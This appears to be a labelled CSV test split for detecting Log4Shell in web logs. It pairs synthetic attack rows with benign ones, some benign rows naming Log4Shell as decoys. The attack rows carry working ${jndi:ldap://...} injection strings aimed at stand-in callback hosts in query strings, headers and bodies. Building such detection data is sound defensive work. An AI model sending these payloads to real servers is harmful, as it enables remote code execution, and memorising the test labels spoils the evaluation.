id,timestamp,source,raw_log,normalized_log,label,attack_family,obfuscation_type,field,split,risk_level
LS-000601,2026-05-17,synthetic,GET /?q=${jndi:ldap://log4j-test.invalid/std} HTTP/1.1,get /?q=${jndi:ldap://log4j-test.invalid/std} http/1.1,1,log4shell,plain,minimal_query,test,critical
LS-000602,2026-05-17,synthetic,GET /api/check?debug=${jndi:ldap://log4j-test.invalid/std} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://log4j-test.invalid/std} http/1.1 host: app.local,1,log4shell,plain,uri_param,test,critical
LS-000603,2026-05-17,synthetic,Request from User-Agent: ${jndi:ldap://log4j-test.invalid/std} | Method: GET | Host: app.local | Path: /api/products?id=123,request from user-agent: ${jndi:ldap://log4j-test.invalid/std} | method: get | host: app.local | path: /api/products?id=123,1,log4shell,plain,user_agent,test,critical
LS-000604,2026-05-17,synthetic,Request from User-Agent: ${jndi:ldap://log4j-test.invalid/std},request from user-agent: ${jndi:ldap://log4j-test.invalid/std},1,log4shell,plain,user_agent_minimal,test,critical
LS-000605,2026-05-17,synthetic,Request from User-Agent: curl/7.88.1 | Method: GET | Host: app.local | Path: /static/app.js | X-Api-Version: ${jndi:ldap://log4j-test.invalid/std},request from user-agent: curl/7.88.1 | method: get | host: app.local | path: /static/app.js | x-api-version: ${jndi:ldap://log4j-test.invalid/std},1,log4shell,plain,x_api_version,test,critical
LS-000606,2026-05-17,synthetic,GET /search?q=${jndi:ldap://log4j-test.invalid/std} HTTP/1.1 Host: app.local User-Agent: curl/7.88.1,get /search?q=${jndi:ldap://log4j-test.invalid/std} http/1.1 host: app.local user-agent: curl/7.88.1,1,log4shell,plain,path,test,critical
LS-000607,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=${jndi:ldap://log4j-test.invalid/std},post /search http/1.1 host: app.local body: query=${jndi:ldap://log4j-test.invalid/std},1,log4shell,plain,body,test,critical
LS-000608,2026-05-17,synthetic,GET /?q=${jndi:ldap://log4j-test.invalid/std} HTTP/1.1,get /?q=${jndi:ldap://log4j-test.invalid/std} http/1.1,1,log4shell,plain,minimal_query,test,critical
LS-000609,2026-05-17,synthetic,GET /api/check?debug=${jndi:ldap://log4j-test.invalid/std} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://log4j-test.invalid/std} http/1.1 host: app.local,1,log4shell,plain,uri_param,test,critical
LS-000610,2026-05-17,synthetic,Request from User-Agent: ${jndi:ldap://log4j-test.invalid/std} | Method: GET | Host: app.local | Path: /metrics,request from user-agent: ${jndi:ldap://log4j-test.invalid/std} | method: get | host: app.local | path: /metrics,1,log4shell,plain,user_agent,test,critical
LS-000611,2026-05-17,synthetic,Request from User-Agent: ${jndi:ldap://log4j-test.invalid/std},request from user-agent: ${jndi:ldap://log4j-test.invalid/std},1,log4shell,plain,user_agent_minimal,test,critical
LS-000612,2026-05-17,synthetic,Request from User-Agent: Java/11.0.13 | Method: GET | Host: app.local | Path: /metrics | X-Api-Version: ${jndi:ldap://log4j-test.invalid/std},request from user-agent: java/11.0.13 | method: get | host: app.local | path: /metrics | x-api-version: ${jndi:ldap://log4j-test.invalid/std},1,log4shell,plain,x_api_version,test,critical
LS-000805,2026-05-17,synthetic,GET /?q=${jndi:ldap://callback.local/std} HTTP/1.1,get /?q=${jndi:ldap://callback.local/std} http/1.1,1,log4shell,plain,minimal_query,test,critical
LS-000806,2026-05-17,synthetic,GET /api/check?debug=${jndi:ldap://callback.local/std} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://callback.local/std} http/1.1 host: app.local,1,log4shell,plain,uri_param,test,critical
LS-000807,2026-05-17,synthetic,Request from User-Agent: ${jndi:ldap://callback.local/std} | Method: GET | Host: app.local | Path: /static/app.js,request from user-agent: ${jndi:ldap://callback.local/std} | method: get | host: app.local | path: /static/app.js,1,log4shell,plain,user_agent,test,critical
LS-000808,2026-05-17,synthetic,Request from User-Agent: ${jndi:ldap://callback.local/std},request from user-agent: ${jndi:ldap://callback.local/std},1,log4shell,plain,user_agent_minimal,test,critical
LS-000809,2026-05-17,synthetic,Request from User-Agent: Java/11.0.13 | Method: GET | Host: app.local | Path: /metrics | X-Api-Version: ${jndi:ldap://callback.local/std},request from user-agent: java/11.0.13 | method: get | host: app.local | path: /metrics | x-api-version: ${jndi:ldap://callback.local/std},1,log4shell,plain,x_api_version,test,critical
LS-000810,2026-05-17,synthetic,GET /search?q=${jndi:ldap://callback.local/std} HTTP/1.1 Host: app.local User-Agent: Mozilla/5.0 Safari/605.1.15,get /search?q=${jndi:ldap://callback.local/std} http/1.1 host: app.local user-agent: mozilla/5.0 safari/605.1.15,1,log4shell,plain,path,test,critical
LS-000811,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=${jndi:ldap://callback.local/std},post /search http/1.1 host: app.local body: query=${jndi:ldap://callback.local/std},1,log4shell,plain,body,test,critical
LS-000812,2026-05-17,synthetic,GET /?q=${jndi:ldap://callback.local/std} HTTP/1.1,get /?q=${jndi:ldap://callback.local/std} http/1.1,1,log4shell,plain,minimal_query,test,critical
LS-000813,2026-05-17,synthetic,GET /api/check?debug=${jndi:ldap://callback.local/std} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://callback.local/std} http/1.1 host: app.local,1,log4shell,plain,uri_param,test,critical
LS-000814,2026-05-17,synthetic,Request from User-Agent: ${jndi:ldap://callback.local/std} | Method: GET | Host: app.local | Path: /,request from user-agent: ${jndi:ldap://callback.local/std} | method: get | host: app.local | path: /,1,log4shell,plain,user_agent,test,critical
LS-000815,2026-05-17,synthetic,Request from User-Agent: ${jndi:ldap://callback.local/std},request from user-agent: ${jndi:ldap://callback.local/std},1,log4shell,plain,user_agent_minimal,test,critical
LS-000816,2026-05-17,synthetic,Request from User-Agent: Java/11.0.13 | Method: GET | Host: app.local | Path: /home | X-Api-Version: ${jndi:ldap://callback.local/std},request from user-agent: java/11.0.13 | method: get | host: app.local | path: /home | x-api-version: ${jndi:ldap://callback.local/std},1,log4shell,plain,x_api_version,test,critical
LS-001009,2026-05-17,synthetic,GET /?q=${jndi:ldap://probe.example.net/std} HTTP/1.1,get /?q=${jndi:ldap://probe.example.net/std} http/1.1,1,log4shell,plain,minimal_query,test,critical
LS-001010,2026-05-17,synthetic,GET /api/check?debug=${jndi:ldap://probe.example.net/std} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://probe.example.net/std} http/1.1 host: app.local,1,log4shell,plain,uri_param,test,critical
LS-001011,2026-05-17,synthetic,Request from User-Agent: ${jndi:ldap://probe.example.net/std} | Method: GET | Host: app.local | Path: /,request from user-agent: ${jndi:ldap://probe.example.net/std} | method: get | host: app.local | path: /,1,log4shell,plain,user_agent,test,critical
LS-001012,2026-05-17,synthetic,Request from User-Agent: ${jndi:ldap://probe.example.net/std},request from user-agent: ${jndi:ldap://probe.example.net/std},1,log4shell,plain,user_agent_minimal,test,critical
LS-001013,2026-05-17,synthetic,Request from User-Agent: curl/7.88.1 | Method: GET | Host: app.local | Path: /login | X-Api-Version: ${jndi:ldap://probe.example.net/std},request from user-agent: curl/7.88.1 | method: get | host: app.local | path: /login | x-api-version: ${jndi:ldap://probe.example.net/std},1,log4shell,plain,x_api_version,test,critical
LS-001014,2026-05-17,synthetic,GET /search?q=${jndi:ldap://probe.example.net/std} HTTP/1.1 Host: app.local User-Agent: Java/11.0.13,get /search?q=${jndi:ldap://probe.example.net/std} http/1.1 host: app.local user-agent: java/11.0.13,1,log4shell,plain,path,test,critical
LS-001015,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=${jndi:ldap://probe.example.net/std},post /search http/1.1 host: app.local body: query=${jndi:ldap://probe.example.net/std},1,log4shell,plain,body,test,critical
LS-001016,2026-05-17,synthetic,GET /?q=${jndi:ldap://probe.example.net/std} HTTP/1.1,get /?q=${jndi:ldap://probe.example.net/std} http/1.1,1,log4shell,plain,minimal_query,test,critical
LS-001017,2026-05-17,synthetic,GET /api/check?debug=${jndi:ldap://probe.example.net/std} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://probe.example.net/std} http/1.1 host: app.local,1,log4shell,plain,uri_param,test,critical
LS-001018,2026-05-17,synthetic,Request from User-Agent: ${jndi:ldap://probe.example.net/std} | Method: GET | Host: app.local | Path: /search?q=boots,request from user-agent: ${jndi:ldap://probe.example.net/std} | method: get | host: app.local | path: /search?q=boots,1,log4shell,plain,user_agent,test,critical
LS-001019,2026-05-17,synthetic,Request from User-Agent: ${jndi:ldap://probe.example.net/std},request from user-agent: ${jndi:ldap://probe.example.net/std},1,log4shell,plain,user_agent_minimal,test,critical
LS-001020,2026-05-17,synthetic,Request from User-Agent: python-requests/2.31.0 | Method: GET | Host: app.local | Path: / | X-Api-Version: ${jndi:ldap://probe.example.net/std},request from user-agent: python-requests/2.31.0 | method: get | host: app.local | path: / | x-api-version: ${jndi:ldap://probe.example.net/std},1,log4shell,plain,x_api_version,test,critical
LS-001213,2026-05-17,synthetic,GET /?q=${jndi:ldap://lab-callback.example.org/std} HTTP/1.1,get /?q=${jndi:ldap://lab-callback.example.org/std} http/1.1,1,log4shell,plain,minimal_query,test,critical
LS-001214,2026-05-17,synthetic,GET /api/check?debug=${jndi:ldap://lab-callback.example.org/std} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://lab-callback.example.org/std} http/1.1 host: app.local,1,log4shell,plain,uri_param,test,critical
LS-001215,2026-05-17,synthetic,Request from User-Agent: ${jndi:ldap://lab-callback.example.org/std} | Method: GET | Host: app.local | Path: /,request from user-agent: ${jndi:ldap://lab-callback.example.org/std} | method: get | host: app.local | path: /,1,log4shell,plain,user_agent,test,critical
LS-001216,2026-05-17,synthetic,Request from User-Agent: ${jndi:ldap://lab-callback.example.org/std},request from user-agent: ${jndi:ldap://lab-callback.example.org/std},1,log4shell,plain,user_agent_minimal,test,critical
LS-001217,2026-05-17,synthetic,Request from User-Agent: Java/11.0.13 | Method: GET | Host: app.local | Path: /api/products?id=123 | X-Api-Version: ${jndi:ldap://lab-callback.example.org/std},request from user-agent: java/11.0.13 | method: get | host: app.local | path: /api/products?id=123 | x-api-version: ${jndi:ldap://lab-callback.example.org/std},1,log4shell,plain,x_api_version,test,critical
LS-001218,2026-05-17,synthetic,GET /search?q=${jndi:ldap://lab-callback.example.org/std} HTTP/1.1 Host: app.local User-Agent: Go-http-client/1.1,get /search?q=${jndi:ldap://lab-callback.example.org/std} http/1.1 host: app.local user-agent: go-http-client/1.1,1,log4shell,plain,path,test,critical
LS-001219,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=${jndi:ldap://lab-callback.example.org/std},post /search http/1.1 host: app.local body: query=${jndi:ldap://lab-callback.example.org/std},1,log4shell,plain,body,test,critical
LS-001220,2026-05-17,synthetic,GET /?q=${jndi:ldap://lab-callback.example.org/std} HTTP/1.1,get /?q=${jndi:ldap://lab-callback.example.org/std} http/1.1,1,log4shell,plain,minimal_query,test,critical
LS-001221,2026-05-17,synthetic,GET /api/check?debug=${jndi:ldap://lab-callback.example.org/std} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://lab-callback.example.org/std} http/1.1 host: app.local,1,log4shell,plain,uri_param,test,critical
LS-001222,2026-05-17,synthetic,Request from User-Agent: ${jndi:ldap://lab-callback.example.org/std} | Method: GET | Host: app.local | Path: /home,request from user-agent: ${jndi:ldap://lab-callback.example.org/std} | method: get | host: app.local | path: /home,1,log4shell,plain,user_agent,test,critical
LS-001223,2026-05-17,synthetic,Request from User-Agent: ${jndi:ldap://lab-callback.example.org/std},request from user-agent: ${jndi:ldap://lab-callback.example.org/std},1,log4shell,plain,user_agent_minimal,test,critical
LS-001224,2026-05-17,synthetic,Request from User-Agent: python-requests/2.31.0 | Method: GET | Host: app.local | Path: /login | X-Api-Version: ${jndi:ldap://lab-callback.example.org/std},request from user-agent: python-requests/2.31.0 | method: get | host: app.local | path: /login | x-api-version: ${jndi:ldap://lab-callback.example.org/std},1,log4shell,plain,x_api_version,test,critical
LS-002883,2026-05-17,benign_logs,POST /login HTTP/1.1 user=demo,post /login http/1.1 user=demo,0,benign,normal_web,mixed,test,low
LS-002884,2026-05-17,benign_logs,GET /docs/log4j-mitigation HTTP/1.1,get /docs/log4j-mitigation http/1.1,0,benign,documentation,mixed,test,low
LS-002885,2026-05-17,benign_logs,GET /home HTTP/1.1,get /home http/1.1,0,benign,normal_web,mixed,test,low
LS-002886,2026-05-17,benign_logs,POST /login HTTP/1.1 user=demo,post /login http/1.1 user=demo,0,benign,normal_web,mixed,test,low
LS-002887,2026-05-17,benign_logs,GET /api/products?id=123 HTTP/1.1,get /api/products?id=123 http/1.1,0,benign,normal_web,mixed,test,low
LS-002888,2026-05-17,benign_logs,GET /api/products?id=123 HTTP/1.1,get /api/products?id=123 http/1.1,0,benign,normal_web,mixed,test,low
LS-002889,2026-05-17,benign_logs,Blog article about Log4Shell payloads was requested,blog article about log4shell payloads was requested,0,benign,documentation,mixed,test,low
LS-002890,2026-05-17,benign_logs,GET /home HTTP/1.1,get /home http/1.1,0,benign,normal_web,mixed,test,low
LS-002891,2026-05-17,benign_logs,POST /login HTTP/1.1 user=demo,post /login http/1.1 user=demo,0,benign,normal_web,mixed,test,low
LS-002892,2026-05-17,benign_logs,POST /login HTTP/1.1 user=demo,post /login http/1.1 user=demo,0,benign,normal_web,mixed,test,low
LS-002893,2026-05-17,benign_logs,GET /home HTTP/1.1,get /home http/1.1,0,benign,normal_web,mixed,test,low
LS-002894,2026-05-17,benign_logs,Blog article about Log4Shell payloads was requested,blog article about log4shell payloads was requested,0,benign,documentation,mixed,test,low
LS-002895,2026-05-17,benign_logs,GET /home HTTP/1.1,get /home http/1.1,0,benign,normal_web,mixed,test,low
LS-002896,2026-05-17,benign_logs,GET /home HTTP/1.1,get /home http/1.1,0,benign,normal_web,mixed,test,low
LS-002897,2026-05-17,benign_logs,GET /docs/log4j-mitigation HTTP/1.1,get /docs/log4j-mitigation http/1.1,0,benign,documentation,mixed,test,low
LS-002898,2026-05-17,benign_logs,GET /docs/log4j-mitigation HTTP/1.1,get /docs/log4j-mitigation http/1.1,0,benign,documentation,mixed,test,low
LS-002899,2026-05-17,benign_logs,Blog article about Log4Shell payloads was requested,blog article about log4shell payloads was requested,0,benign,documentation,mixed,test,low
LS-002900,2026-05-17,benign_logs,GET /docs/log4j-mitigation HTTP/1.1,get /docs/log4j-mitigation http/1.1,0,benign,documentation,mixed,test,low
LS-002901,2026-05-17,benign_logs,GET /api/products?id=123 HTTP/1.1,get /api/products?id=123 http/1.1,0,benign,normal_web,mixed,test,low
LS-002902,2026-05-17,benign_logs,GET /docs/log4j-mitigation HTTP/1.1,get /docs/log4j-mitigation http/1.1,0,benign,documentation,mixed,test,low
LS-002903,2026-05-17,benign_logs,GET /docs/log4j-mitigation HTTP/1.1,get /docs/log4j-mitigation http/1.1,0,benign,documentation,mixed,test,low
LS-002904,2026-05-17,benign_logs,GET /docs/log4j-mitigation HTTP/1.1,get /docs/log4j-mitigation http/1.1,0,benign,documentation,mixed,test,low
LS-002905,2026-05-17,benign_logs,POST /login HTTP/1.1 user=demo,post /login http/1.1 user=demo,0,benign,normal_web,mixed,test,low
LS-002906,2026-05-17,benign_logs,Developer opened Java Naming and Directory Interface documentation,developer opened java naming and directory interface documentation,0,benign,documentation,mixed,test,low
LS-002907,2026-05-17,benign_logs,GET /docs/log4j-mitigation HTTP/1.1,get /docs/log4j-mitigation http/1.1,0,benign,documentation,mixed,test,low
LS-002908,2026-05-17,benign_logs,GET /home HTTP/1.1,get /home http/1.1,0,benign,normal_web,mixed,test,low
LS-002909,2026-05-17,benign_logs,GET /docs/log4j-mitigation HTTP/1.1,get /docs/log4j-mitigation http/1.1,0,benign,documentation,mixed,test,low
LS-002910,2026-05-17,benign_logs,Developer opened Java Naming and Directory Interface documentation,developer opened java naming and directory interface documentation,0,benign,documentation,mixed,test,low
LS-002911,2026-05-17,benign_logs,Blog article about Log4Shell payloads was requested,blog article about log4shell payloads was requested,0,benign,documentation,mixed,test,low
LS-002912,2026-05-17,benign_logs,Blog article about Log4Shell payloads was requested,blog article about log4shell payloads was requested,0,benign,documentation,mixed,test,low
LS-002913,2026-05-17,benign_logs,GET /api/products?id=123 HTTP/1.1,get /api/products?id=123 http/1.1,0,benign,normal_web,mixed,test,low
LS-002914,2026-05-17,benign_logs,GET /api/products?id=123 HTTP/1.1,get /api/products?id=123 http/1.1,0,benign,normal_web,mixed,test,low
LS-002915,2026-05-17,benign_logs,GET /docs/log4j-mitigation HTTP/1.1,get /docs/log4j-mitigation http/1.1,0,benign,documentation,mixed,test,low
LS-002916,2026-05-17,benign_logs,GET /home HTTP/1.1,get /home http/1.1,0,benign,normal_web,mixed,test,low
LS-002917,2026-05-17,benign_logs,GET /home HTTP/1.1,get /home http/1.1,0,benign,normal_web,mixed,test,low
LS-002918,2026-05-17,benign_logs,POST /login HTTP/1.1 user=demo,post /login http/1.1 user=demo,0,benign,normal_web,mixed,test,low
LS-002919,2026-05-17,benign_logs,GET /home HTTP/1.1,get /home http/1.1,0,benign,normal_web,mixed,test,low
LS-002920,2026-05-17,benign_logs,POST /login HTTP/1.1 user=demo,post /login http/1.1 user=demo,0,benign,normal_web,mixed,test,low
LS-002921,2026-05-17,benign_logs,POST /login HTTP/1.1 user=demo,post /login http/1.1 user=demo,0,benign,normal_web,mixed,test,low
LS-002922,2026-05-17,benign_logs,GET /home HTTP/1.1,get /home http/1.1,0,benign,normal_web,mixed,test,low
LS-002923,2026-05-17,benign_logs,GET /home HTTP/1.1,get /home http/1.1,0,benign,normal_web,mixed,test,low
LS-002924,2026-05-17,benign_logs,POST /login HTTP/1.1 user=demo,post /login http/1.1 user=demo,0,benign,normal_web,mixed,test,low
LS-002925,2026-05-17,benign_logs,GET /api/products?id=123 HTTP/1.1,get /api/products?id=123 http/1.1,0,benign,normal_web,mixed,test,low
LS-002926,2026-05-17,benign_logs,GET /docs/log4j-mitigation HTTP/1.1,get /docs/log4j-mitigation http/1.1,0,benign,documentation,mixed,test,low
LS-002927,2026-05-17,benign_logs,GET /api/products?id=123 HTTP/1.1,get /api/products?id=123 http/1.1,0,benign,normal_web,mixed,test,low
LS-002928,2026-05-17,benign_logs,Blog article about Log4Shell payloads was requested,blog article about log4shell payloads was requested,0,benign,documentation,mixed,test,low
LS-002929,2026-05-17,benign_logs,GET /home HTTP/1.1,get /home http/1.1,0,benign,normal_web,mixed,test,low
LS-002930,2026-05-17,benign_logs,Developer opened Java Naming and Directory Interface documentation,developer opened java naming and directory interface documentation,0,benign,documentation,mixed,test,low
LS-002931,2026-05-17,benign_logs,GET /home HTTP/1.1,get /home http/1.1,0,benign,normal_web,mixed,test,low
LS-002932,2026-05-17,benign_logs,POST /login HTTP/1.1 user=demo,post /login http/1.1 user=demo,0,benign,normal_web,mixed,test,low
LS-002933,2026-05-17,benign_logs,Developer opened Java Naming and Directory Interface documentation,developer opened java naming and directory interface documentation,0,benign,documentation,mixed,test,low
LS-002934,2026-05-17,benign_logs,Developer opened Java Naming and Directory Interface documentation,developer opened java naming and directory interface documentation,0,benign,documentation,mixed,test,low
LS-002935,2026-05-17,benign_logs,GET /docs/log4j-mitigation HTTP/1.1,get /docs/log4j-mitigation http/1.1,0,benign,documentation,mixed,test,low
LS-002936,2026-05-17,benign_logs,Blog article about Log4Shell payloads was requested,blog article about log4shell payloads was requested,0,benign,documentation,mixed,test,low
LS-002937,2026-05-17,benign_logs,GET /home HTTP/1.1,get /home http/1.1,0,benign,normal_web,mixed,test,low
LS-002938,2026-05-17,benign_logs,GET /docs/log4j-mitigation HTTP/1.1,get /docs/log4j-mitigation http/1.1,0,benign,documentation,mixed,test,low
LS-002939,2026-05-17,benign_logs,Blog article about Log4Shell payloads was requested,blog article about log4shell payloads was requested,0,benign,documentation,mixed,test,low
LS-002940,2026-05-17,benign_logs,GET /api/products?id=123 HTTP/1.1,get /api/products?id=123 http/1.1,0,benign,normal_web,mixed,test,low
LS-002941,2026-05-17,benign_logs,Developer opened Java Naming and Directory Interface documentation,developer opened java naming and directory interface documentation,0,benign,documentation,mixed,test,low
LS-002942,2026-05-17,benign_logs,GET /docs/log4j-mitigation HTTP/1.1,get /docs/log4j-mitigation http/1.1,0,benign,documentation,mixed,test,low
LS-002943,2026-05-17,benign_logs,GET /api/products?id=123 HTTP/1.1,get /api/products?id=123 http/1.1,0,benign,normal_web,mixed,test,low
LS-002944,2026-05-17,benign_logs,GET /home HTTP/1.1,get /home http/1.1,0,benign,normal_web,mixed,test,low
LS-002945,2026-05-17,benign_logs,GET /home HTTP/1.1,get /home http/1.1,0,benign,normal_web,mixed,test,low
LS-002946,2026-05-17,benign_logs,POST /login HTTP/1.1 user=demo,post /login http/1.1 user=demo,0,benign,normal_web,mixed,test,low
LS-002947,2026-05-17,benign_logs,GET /api/products?id=123 HTTP/1.1,get /api/products?id=123 http/1.1,0,benign,normal_web,mixed,test,low
LS-002948,2026-05-17,benign_logs,GET /api/products?id=123 HTTP/1.1,get /api/products?id=123 http/1.1,0,benign,normal_web,mixed,test,low
LS-002949,2026-05-17,benign_logs,GET /docs/log4j-mitigation HTTP/1.1,get /docs/log4j-mitigation http/1.1,0,benign,documentation,mixed,test,low
LS-002950,2026-05-17,benign_logs,Blog article about Log4Shell payloads was requested,blog article about log4shell payloads was requested,0,benign,documentation,mixed,test,low
LS-002951,2026-05-17,benign_logs,Developer opened Java Naming and Directory Interface documentation,developer opened java naming and directory interface documentation,0,benign,documentation,mixed,test,low
